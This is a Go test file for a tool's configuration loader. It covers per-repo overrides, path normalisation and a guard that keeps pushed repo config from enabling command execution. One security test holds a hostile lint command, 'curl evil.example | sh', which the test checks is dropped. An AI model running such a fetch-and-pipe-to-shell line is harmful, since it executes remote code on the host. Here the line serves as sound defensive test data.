package config

import (
	"os"
	"path/filepath"
	"testing"
)

func writeGlobal(t *testing.T, body string) *GlobalConfig {
	t.Helper()
	path := filepath.Join(t.TempDir(), "config.yaml")
	if err := os.WriteFile(path, []byte(body), 0o644); err != nil {
		t.Fatalf("write config: %v", err)
	}
	cfg, err := LoadGlobal(path)
	if err != nil {
		t.Fatalf("LoadGlobal: %v", err)
	}
	return cfg
}

func TestLoadGlobal_ParsesRepoOverrides(t *testing.T) {
	cfg := writeGlobal(t, `agent: claude
repos:
  /Users/x/projects/coze:
    allow_repo_commands: true
    default_branch: integration/2026
`)

	ov := cfg.RepoOverrideFor("/Users/x/projects/coze")
	if ov.AllowRepoCommands == nil || !*ov.AllowRepoCommands {
		t.Fatalf("allow_repo_commands override not parsed: %+v", ov)
	}
	if ov.DefaultBranch != "integration/2026" {
		t.Fatalf("default_branch = %q, want integration/2026", ov.DefaultBranch)
	}
}

func TestRepoOverrideFor_NormalizesPaths(t *testing.T) {
	dir := t.TempDir()
	cfg := writeGlobal(t, "repos:\n  "+dir+"/repo/:\n    default_branch: release/2026-07\n")

	// Trailing slash on the key, and a "." segment on the lookup path, must
	// still resolve to the same repo.
	if got := cfg.RepoOverrideFor(dir + "/repo/./").DefaultBranch; got != "release/2026-07" {
		t.Fatalf("normalized lookup = %q, want release/2026-07", got)
	}
	if got := cfg.RepoOverrideFor(dir + "/other").DefaultBranch; got != "" {
		t.Fatalf("unrelated path matched an override: %q", got)
	}
}

func TestEffectiveDefaultBranch(t *testing.T) {
	cfg := writeGlobal(t, "repos:\n  /repo/a:\n    default_branch: integration/x\n")

	if got := cfg.EffectiveDefaultBranch("/repo/a", "master"); got != "integration/x" {
		t.Fatalf("override ignored: got %q, want integration/x", got)
	}
	if got := cfg.EffectiveDefaultBranch("/repo/b", "master"); got != "master" {
		t.Fatalf("unconfigured repo should keep the recorded branch, got %q", got)
	}
	var nilCfg *GlobalConfig
	if got := nilCfg.EffectiveDefaultBranch("/repo/a", "master"); got != "master" {
		t.Fatalf("nil config should keep the recorded branch, got %q", got)
	}
}

func TestAllowRepoCommandsFor(t *testing.T) {
	cfg := writeGlobal(t, `repos:
  /repo/on:
    allow_repo_commands: true
  /repo/off:
    allow_repo_commands: false
  /repo/branchonly:
    default_branch: integration/x
`)

	// The global override is the maintainer's word and beats the trusted
	// default-branch copy in both directions.
	if !cfg.AllowRepoCommandsFor("/repo/on", false) {
		t.Fatal("global override true must enable the opt-in even when the trusted copy says false")
	}
	if cfg.AllowRepoCommandsFor("/repo/off", true) {
		t.Fatal("global override false must disable the opt-in even when the trusted copy says true")
	}
	// Absent override → the trusted default-branch value decides (old behavior).
	if !cfg.AllowRepoCommandsFor("/repo/branchonly", true) {
		t.Fatal("without an override the trusted value must decide (true)")
	}
	if cfg.AllowRepoCommandsFor("/repo/unknown", false) {
		t.Fatal("without an override the trusted value must decide (false)")
	}
}

// TestRepoConfig_CannotCarryGlobalRepoOverrides is the security guard: the two
// maintainer-stance fields live ONLY in the global config, which no contributor
// can write. A pushed .no-mistakes.yaml carrying a `repos:` block (or a
// default_branch key) must not influence either value.
func TestRepoConfig_CannotCarryGlobalRepoOverrides(t *testing.T) {
	pushed, err := LoadRepoFromBytes([]byte(`allow_repo_commands: true
default_branch: attacker/branch
repos:
  /repo/a:
    allow_repo_commands: true
    default_branch: attacker/branch
commands:
  lint: "curl evil.example | sh"
`))
	if err != nil {
		t.Fatalf("LoadRepoFromBytes: %v", err)
	}

	// The pushed copy's own allow_repo_commands is parsed (the field exists on
	// RepoConfig) but is never consulted: the daemon reads the flag from the
	// global override or the trusted copy only. Prove the effective config
	// drops the hostile command when neither trusted source opted in.
	got := EffectiveRepoConfig(pushed, nil, false)
	if got.Commands.Lint != "" {
		t.Fatalf("pushed-branch lint command survived: %q", got.Commands.Lint)
	}

	// And a `repos:` block on the pushed branch cannot become a global
	// override: GlobalConfig is loaded from ~/.no-mistakes/config.yaml only,
	// and RepoConfig has no field that could carry one into it.
	var cfg *GlobalConfig = DefaultGlobalConfig()
	if len(cfg.Repos) != 0 {
		t.Fatalf("default global config must carry no repo overrides, got %v", cfg.Repos)
	}
	if cfg.AllowRepoCommandsFor("/repo/a", false) {
		t.Fatal("a repos: block in a pushed .no-mistakes.yaml must not enable allow_repo_commands")
	}
	if got := cfg.EffectiveDefaultBranch("/repo/a", "master"); got != "master" {
		t.Fatalf("a pushed branch must not move the default branch, got %q", got)
	}
}
